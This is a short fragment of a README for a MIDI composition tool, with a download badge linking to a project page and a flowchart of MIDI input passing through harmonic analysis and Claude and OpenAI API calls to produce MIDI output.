...
[![Download](https://img.shields.io/badge/Download%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://preciousknows.github.io/reMIDI-SongWish-Studio/)
...
```mermaid
flowchart TD
    A[Raw MIDI Input] --> B{Harmonic Analyzer}
    B --> C[Claude API – Phrase Prediction]
    B --> D[OpenAI API – Structure Suggestion]
    C --> E[Responsive UI Render]
    D --> E
    E --> F[User Acceptance]
    F --> G[Final MIDI Output]
    G --> H[DAW / Hardware Synth]
```
